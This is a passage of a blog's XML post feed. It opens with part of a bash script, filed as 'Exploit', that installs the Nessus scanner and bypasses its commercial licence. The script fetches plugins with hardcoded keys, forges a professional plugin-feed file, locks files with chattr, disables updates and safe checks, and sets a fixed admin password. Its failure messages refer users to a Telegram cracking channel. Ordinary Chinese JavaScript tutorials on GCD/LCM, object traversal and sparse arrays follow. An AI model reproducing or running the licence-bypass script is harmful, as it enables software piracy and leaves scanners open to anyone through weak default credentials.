string">" o stopping old nessusd in case there is one!"</span>/bin/systemctl stop nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o downloading Nessus.."</span><span class="token function">curl</span> <span class="token parameter variable">-A</span> Mozilla <span class="token parameter variable">--request</span> GET <span class="token punctuation">\</span>  <span class="token parameter variable">--url</span> <span class="token string">'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-latest-ubuntu1404_amd64.deb'</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--output</span> <span class="token string">'Nessus-latest-ubuntu1404_amd64.deb'</span> <span class="token operator">&amp;></span>/dev/null<span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> Nessus-latest-ubuntu1404_amd64.deb <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">" o nessus download failed :/ exiting. get copy of it from t.me/pwn3rzs"</span>  <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">" o installing Nessus.."</span>dpkg <span class="token parameter variable">-i</span> Nessus-latest-ubuntu1404_amd64.deb <span class="token operator">&amp;></span>/dev/null<span class="token comment"># look I tried to just make changes and run but it doesnt work. if you can optimize</span><span class="token comment"># what im doing here, let me know.  but this was it for me, it had to be run once :/</span><span class="token builtin class-name">echo</span> <span class="token string">" o starting service once FIRST TIME INITIALIZATION (we have to do this)"</span>/bin/systemctl start nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o let's allow Nessus time to initalize - we'll give it like 20 seconds..."</span><span class="token function">sleep</span> <span class="token number">20</span><span class="token builtin class-name">echo</span> <span class="token string">" o stopping the nessus service.."</span>/bin/systemctl stop nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o changing nessus settings to Zen preferences (freedom fighter mode)"</span><span class="token builtin class-name">echo</span> <span class="token string">"   listen port: 11127"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">xmlrpc_listen_port</span><span class="token operator">=</span><span class="token number">11127</span> <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   theme:       dark"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">ui_theme</span><span class="token operator">=</span>dark <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   safe checks: off"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">safe_checks</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   logs:        performance"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">backend_log_level</span><span class="token operator">=</span>performance <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   updates:     off"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">auto_update</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">auto_update_ui</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">disable_core_updates</span><span class="token operator">=</span>true <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">"   telemetry:   off"</span>/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">report_crashes</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null/opt/nessus/sbin/nessuscli fix <span class="token parameter variable">--set</span> <span class="token assign-left variable">send_telemetry</span><span class="token operator">=</span>false <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o adding a user you can change this later (u:admin,p:ddosi)"</span><span class="token function">cat</span> <span class="token operator">></span> expect.tmp<span class="token operator">&lt;&lt;</span><span class="token string">'EOF'spawn /opt/nessus/sbin/nessuscli adduser adminexpect "Login password:"send "ddosi\r"expect "Login password (again):"send "ddosi\r"expect "*(can upload plugins, etc.)? (y/n)*"send "y\r"expect "*(the user can have an empty rules set)"send "\r"expect "Is that ok*"send "y\r"expect eofEOF</span><span class="token function">expect</span> <span class="token parameter variable">-f</span> expect.tmp <span class="token operator">&amp;></span>/dev/null<span class="token function">rm</span> <span class="token parameter variable">-rf</span> expect.tmp <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o downloading new plugins.."</span><span class="token function">curl</span> <span class="token parameter variable">-A</span> Mozilla <span class="token parameter variable">-o</span> all-2.0.tar.gz <span class="token punctuation">\</span>  <span class="token parameter variable">--url</span> <span class="token string">'https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;u=4e2abfd83a40e2012ebf6537ade2f207&amp;p=29a34e24fc12d3f5fdfbb1ae948972c6'</span> <span class="token operator">&amp;></span>/dev/null<span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> all-2.0.tar.gz <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">" o plugins all-2.0.tar.gz download failed :/ exiting. get copy of it from t.me/pwn3rzs"</span>  <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span> <span class="token punctuation">&#125;</span><span class="token builtin class-name">echo</span> <span class="token string">" o installing plugins.."</span>/opt/nessus/sbin/nessuscli update all-2.0.tar.gz <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o fetching version number.."</span><span class="token comment"># i have seen this not be correct for the download.  hrm. but, it works for me.</span><span class="token assign-left variable">vernum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">curl</span> https://plugins.nessus.org/v2/plugins.php <span class="token operator"><span class="token file-descriptor important">2</span>></span> /dev/null<span class="token variable">)</span></span><span class="token builtin class-name">echo</span> <span class="token string">" o building plugin feed..."</span><span class="token function">cat</span> <span class="token operator">></span> /opt/nessus/var/nessus/plugin_feed_info.inc <span class="token operator">&lt;&lt;</span><span class="token string">EOFPLUGIN_SET = "<span class="token variable">$&#123;vernum&#125;</span>";PLUGIN_FEED = "ProfessionalFeed (Direct)";PLUGIN_FEED_TRANSPORT = "Tenable Network Security Lightning";EOF</span><span class="token builtin class-name">echo</span> <span class="token string">" o protecting files.."</span>chattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/null<span class="token function">cp</span> /opt/nessus/var/nessus/plugin_feed_info.inc /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o let's set everything immutable..."</span>chattr +i /opt/nessus/var/nessus/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/nullchattr +i <span class="token parameter variable">-R</span> /opt/nessus/lib/nessus/plugins <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o but unsetting key files.."</span>chattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins/plugin_feed_info.inc <span class="token operator">&amp;></span>/dev/nullchattr <span class="token parameter variable">-i</span> /opt/nessus/lib/nessus/plugins  <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o starting service.."</span>/bin/systemctl start nessusd.service <span class="token operator">&amp;></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token string">" o Let's sleep for another 20 seconds to let the server have time to start!"</span><span class="token function">sleep</span> <span class="token number">20</span><span class="token builtin class-name">echo</span> <span class="token string">" o Monitoring Nessus progress. Following line updates every 10 seconds until 100%"</span><span class="token assign-left variable">zen</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$zen</span> <span class="token parameter variable">-ne</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token keyword">do</span> <span class="token assign-left variable">statline</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">curl</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-k</span> https://localhost:11127/server/status<span class="token operator">|</span><span class="token function">awk</span> -F<span class="token string">","</span> <span class="token parameter variable">-v</span> <span class="token assign-left variable">k</span><span class="token operator">=</span><span class="token string">"engine_status"</span> <span class="token string">'&#123; gsub(/&#123;|&#125;/,""); for(i=1;i&lt;=NF;i++) &#123; if ( $i ~ k )&#123;printf $i&#125; &#125; &#125;'</span><span class="token variable">`</span></span> <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$statline</span> <span class="token operator">!=</span> *<span class="token string">"engine_status"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"<span class="token entity" title="\n">\n</span> Problem: Nessus server unreachable? Trying again..<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token keyword">fi</span> <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">"<span class="token entity" title="\r">\r</span> <span class="token variable">$statline</span>"</span> <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$statline</span> <span class="token operator">==</span> *<span class="token string">"100"</span>* <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token assign-left variable">zen</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token function">sleep</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">'\n  o Done!\n'</span><span class="token builtin class-name">echo</span><span class="token builtin class-name">echo</span> <span class="token string">"        Access your Nessus:  https://localhost:11127/ (or your VPS IP)"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             username: admin"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             password: ddosi"</span><span class="token builtin class-name">echo</span> <span class="token string">"                             you can change this any time"</span><span class="token builtin class-name">echo</span><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"Press enter to continue"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Exploit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux-nessus web漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 求最小公倍数</title>
      <link href="/2024/09/27/javascript/javascript-qiu-zui-xiao-gong-bei-shu/"/>
      <url>/2024/09/27/javascript/javascript-qiu-zui-xiao-gong-bei-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="最小公倍数-Least-Common-Multiple"><a href="#最小公倍数-Least-Common-Multiple" class="headerlink" title="最小公倍数(Least Common Multiple)"></a>最小公倍数(Least Common Multiple)</h1><p><strong>最小公倍数</strong>是中学数学知识中的一个概念，具体定义可以 自行了解，这里只大致解释一下，通常几个正整数会存在许多个倍数，每个倍数除以这几个正整数后都没有余数，而这些倍数之中最小的一个则称为最小公倍数；</p><p>一般直接计算最小公倍数较为困难，因此需要用到一个计算公式，即两个数的乘积等于这两个数的最大公约数与最小公倍数的乘积，所以知道两个数的最大公约数或者求最小公倍数，就可以求得另外一个，接下来先来实现<strong>最大公约数</strong>的求法；</p><h1 id="最大公约数-Greatest-Common-Divisor"><a href="#最大公约数-Greatest-Common-Divisor" class="headerlink" title="最大公约数(Greatest Common Divisor)"></a>最大公约数(Greatest Common Divisor)</h1><p>这也是与最小公倍数相似的另一个概念，几个正整数之间一般存在多个约数，即这几个正整数除以这个约数后都没有余数，这些约数中最大的一个称为<strong>最大公约数</strong>；下面来实现求最大公约数的函数；</p><h2 id="最大质因数法"><a href="#最大质因数法" class="headerlink" title="最大质因数法"></a>最大质因数法</h2><p>思路很简单，即将两个数分别递减，获取能同时被二者除尽的最大的一个数，即最大公约数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getGcd</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> a<span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> b<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">%</span> i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">%</span> j <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">===</span> j<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> j<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h2><p>思路是用两个数中的最大项除以最小项，如果能除尽，那么最小项便是这两个数的最大公约数；不能除尽则用最大项除以最小项所得余数，与最小项再进行同样的递归操作，最后得到最大的约数，也就是所谓的<strong>辗转相除</strong>；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getGcd</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> max <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> min <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>max <span class="token operator">%</span> min <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> min<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">getGcd</span><span class="token punctuation">(</span>max <span class="token operator">%</span> min<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="求最小公倍数"><a href="#求最小公倍数" class="headerlink" title="求最小公倍数"></a>求最小公倍数</h1><p>有了求最大公约数的函数后，再来求最小公倍数就简单了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getLcm</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">*</span> b <span class="token operator">/</span> <span class="token function">getGcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 公倍数 公约数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 深度迭代遍历未知对象</title>
      <link href="/2024/09/27/javascript/javascript-shen-du-die-dai-bian-li-wei-zhi-dui-xiang/"/>
      <url>/2024/09/27/javascript/javascript-shen-du-die-dai-bian-li-wei-zhi-dui-xiang/</url>
      
        <content type="html"><![CDATA[<p>面向对象编程的语言，都存在对对象的一些操作，其中就包括遍历未知对象的属性值。</p><h1 id="通常情况"><a href="#通常情况" class="headerlink" title="通常情况"></a>通常情况</h1><p>常见的遍历对象的方法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'cloud'</span><span class="token punctuation">,</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> o<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// name: cloud</span><span class="token comment">// age: 20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>但是对象中又含有子对象，对象的属性又是另一个对象，或者更深层嵌套，上面方法就不适用了；</p><p>下面使用<strong>递归</strong>实现这个功能：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">firstName</span><span class="token operator">:</span> <span class="token string">'cloud'</span><span class="token punctuation">,</span>        <span class="token literal-property property">lastName</span><span class="token operator">:</span> <span class="token string">'huang'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 这里使用递归，属性类型为对象则进一步遍历</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">myFn</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">myFn</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 输出：</span><span class="token comment">// name: [object Object]</span><span class="token comment">// firstName: cloud</span><span class="token comment">// lastName: huang</span><span class="token comment">// age: 20</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样的话不论对象有多复杂的结构都能全部遍历到位；</p><h1 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h1><p>但同时，这也是个问题，一些对象层次非常深甚至是死循环的情况就尴尬了，类似于子对象属性与父对象属性一样，尝试用上诉函数遍历一下浏览器的<code>window</code> 对象就能体会了，你会后悔的；</p><p>所以为避免这种尴尬情况，设置一个<strong>迭代深度值</strong>吧，指定遍历到第几代：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> depth <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// depth为迭代深度值</span><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        depth<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;</span> <span class="token number">10</span>        <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">myFn</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用一种类似<strong>懒加载</strong>的形式：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">myFn</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// 判断用户是否要继续迭代</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">confirmFn</span><span class="token punctuation">(</span><span class="token string">'是否深入遍历？'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">myFn</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 迭代遍历 深度遍历 未知对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 稀疏数组</title>
      <link href="/2024/09/27/javascript/javascript-xi-shu-shu-zu/"/>
      <url>/2024/09/27/javascript/javascript-xi-shu-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="稀疏数组"><a href="#稀疏数组" class="headerlink" title="稀疏数组"></a>稀疏数组</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>在一些后端语言中，如 C，数组内的值通常被分配在一系列连续的内存地址上，但是在 js 中，某些数组内存则不是连续的，所谓<strong>稀疏</strong>，顾名思义，不连续，存在一些空隙；</p><p>例如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// (3) [empty × 3]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>通过以上方法创建数组，其中 <code>Array(3)</code> 中的参数 3 表示数组的长度，这个数组就是稀疏的，控制台输出一般带有 <code>empty</code> 字样，或者像下面这样创建数组：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// (3) [1, empty, 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为定义语句中两个逗号之间无字符，没有定义值，同样带有 <code>empty</code> 字样，代表稀疏数组，这里可以把 <code>empty</code> 理解为上面讲到的 <strong>空隙</strong>；</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>接下来看一下稀疏数组特殊在什么地方，举个例子说明：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 正常数组</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 稀疏数组</span><span class="token keyword">var</span> arr3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 稀疏数组</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr1<span class="token punctuation">.</span>length<span class="token punctuation">,</span> arr2<span class="token punctuation">.</span>length<span class="token punctuation">,</span> arr3<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 3 3 3</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> arr3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// undefined undefined</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span 